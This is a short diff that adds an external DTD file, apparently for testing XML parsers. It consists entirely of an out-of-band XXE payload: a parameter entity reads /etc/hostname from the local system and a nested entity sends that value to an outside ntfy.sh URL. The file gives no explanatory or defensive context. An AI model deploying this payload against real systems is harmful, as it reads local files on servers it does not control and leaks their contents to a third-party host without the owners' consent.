@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY &#x25; exfil SYSTEM 'https://ntfy.sh/xxent1795252275/trigger?host=%file;'>">
+%all;
+%exfil;
